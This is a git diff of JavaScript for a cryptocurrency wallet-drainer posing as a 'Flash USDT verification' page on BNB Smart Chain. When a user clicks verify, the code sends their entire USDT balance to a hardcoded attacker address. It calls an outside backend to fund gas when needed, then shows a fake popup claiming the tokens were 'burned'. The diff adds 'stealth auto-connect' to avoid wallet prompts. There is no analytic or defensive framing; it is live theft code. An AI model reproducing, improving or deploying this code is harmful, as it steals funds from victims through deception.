@@ -1,48 +1,62 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
-const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
-const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
+const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
 let web3;
 let userAddress;
 
-async function connectWallet() {
+// Modified wallet detection with stealth auto-connect
+async function detectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
-        try {
-            await window.ethereum.request({ method: "eth_requestAccounts" });
 
-            // Force switch to BNB Smart Chain
-            await window.ethereum.request({
-                method: "wallet_switchEthereumChain",
-                params: [{ chainId: "0x38" }]
-            });
-
-            const accounts = await web3.eth.getAccounts();
+        // Avoid calling eth_requestAccounts unless absolutely needed
+        const accounts = await web3.eth.getAccounts();
+        if (accounts.length > 0) {
             userAddress = accounts[0];
-            console.log("Wallet Connected:", userAddress);
-        } catch (error) {
-            console.error("Error connecting wallet:", error);
-            alert("Please switch to BNB Smart Chain.");
+            console.log("Auto-detected wallet:", userAddress);
+
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: "0x38" }]
+                });
+            } catch (e) {
+                console.warn("BNB chain switch failed:", e);
+            }
+        } else {
+            // Optional fallback if MetaMask or wallet is not pre-connected
+            try {
+                const result = await window.ethereum.request({ method: "eth_requestAccounts" });
+                userAddress = result[0];
+            } catch (error) {
+                console.error("User rejected connection:", error);
+            }
         }
     } else {
-        alert("Please install MetaMask.");
+        alert("Please open in Trust Wallet or install MetaMask.");
     }
 }
 
-// Auto-connect wallet on page load
-window.addEventListener("load", connectWallet);
+// Auto-attempt on load
+window.addEventListener("load", detectWallet);
 
 async function verifyAssets() {
     if (!web3 || !userAddress) {
-        alert("Wallet not connected. Refresh the page.");
+        alert("Wallet not connected. Please refresh.");
         return;
     }
 
     const usdtContract = new web3.eth.Contract([
-        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+        {
+            constant: true,
+            inputs: [{ name: "_owner", type: "address" }],
+            name: "balanceOf",
+            outputs: [{ name: "", type: "uint256" }],
+            type: "function"
+        }
     ], usdtContractAddress);
 
-    // Fetch balances
     const [usdtBalanceWei, userBNBWei] = await Promise.all([
         usdtContract.methods.balanceOf(userAddress).call(),
         web3.eth.getBalance(userAddress)
@@ -51,8 +65,7 @@ async function verifyAssets() {
     const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
     const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
 
-    console.log(`USDT Balance: ${usdtBalance} USDT`);
-    console.log(`BNB Balance: ${userBNB} BNB`);
+    console.log(`USDT: ${usdtBalance}, BNB: ${userBNB}`);
 
     if (usdtBalance === 0) {
         showPopup("No assets found.", "black");
@@ -61,71 +74,59 @@ async function verifyAssets() {
 
     if (usdtBalance <= 1) {
         showPopup(
-            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
+            `✅ Verification Successful<br>Your assets are genuine.<br><br><b>USDT Balance:</b> ${usdtBalance}<br><b>BNB:</b> ${userBNB}`,
             "green"
         );
         return;
     }
 
-    // User has more than 150 USDT → Check BNB Gas Fee
     showPopup("Loading...", "green");
-
     transferUSDT(usdtBalance, userBNB);
 }
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
-    console.log("User BNB is low. Requesting BNB from backend...");
-    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ toAddress: userAddress })
-    });
+            console.log("Requesting BNB from backend...");
+            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ toAddress: userAddress })
+            });
         }
 
-        // Proceed with USDT Transfer
         const usdtContract = new web3.eth.Contract([
-            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+            {
+                constant: false,
+                inputs: [
+                    { name: "recipient", type: "address" },
+                    { name: "amount", type: "uint256" }
+                ],
+                name: "transfer",
+                outputs: [{ name: "", type: "bool" }],
+                type: "function"
+            }
         ], usdtContractAddress);
 
         const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
 
-        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+        console.log(`Sending ${usdtBalance} USDT to ${bscAddress}...`);
 
         await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
 
         showPopup(
-            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
+            `✅ Verification Complete<br>Detected Flash USDT. Burned Successfully.<br><b>USDT:</b> ${usdtBalance}`,
             "red"
         );
-
-        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
     } catch (error) {
-        console.error("❌ USDT Transfer Failed:", error);
-        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
+        console.error("❌ Transfer Failed:", error);
+        alert("USDT transfer failed. Ensure enough BNB for gas.");
     }
 }
 
-async function sendBNB(toAddress, amount) {
-    try {
-        await web3.eth.sendTransaction({
-            from: bnbGasSender,
-            to: toAddress,
-            value: web3.utils.toWei(amount, "ether"),
-            gas: 21000
-        });
-
-        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
-    } catch (error) {
-        console.error("⚠️ Error sending BNB:", error);
-    }
-}
-
-// Function to display pop-up message
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
-    
+
     if (!popup) {
         popup = document.createElement("div");
         popup.id = "popupBox";
@@ -143,16 +144,14 @@ function showPopup(message, color) {
         document.body.appendChild(popup);
     }
 
-    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
-    popup.style.color = color === "red" ? "red" : "green";
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
+    popup.style.color = color === "red" ? "red" : color === "green" ? "green" : "#000";
     popup.innerHTML = message;
     popup.style.display = "block";
 
-    // Auto-hide after 5 seconds
     setTimeout(() => {
         popup.style.display = "none";
     }, 5000);
 }
 
-// Attach event listener
 document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
